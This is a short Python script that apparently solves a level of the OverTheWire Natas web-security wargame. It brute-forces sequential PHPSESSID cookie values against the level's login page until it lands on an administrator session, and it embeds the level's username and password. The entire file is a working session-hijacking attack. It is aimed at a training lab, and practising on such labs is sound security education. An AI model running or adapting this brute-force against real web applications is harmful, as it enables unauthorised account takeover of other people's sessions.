import requests

def admin_search():
	i = 0
	while True:
		path = 'http://natas18.natas.labs.overthewire.org/index.php'
		auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
		cookies = dict(PHPSESSID='{}'.format(i))
		r = requests.get(path, auth=auth, cookies=cookies)
		print(i)
		if 'regular user' not in r.text:
			return r.text
			break
		i = i+1


def main():
	print('Looking for admin...')
	admin_response = admin_search()
	print(admin_response)

main()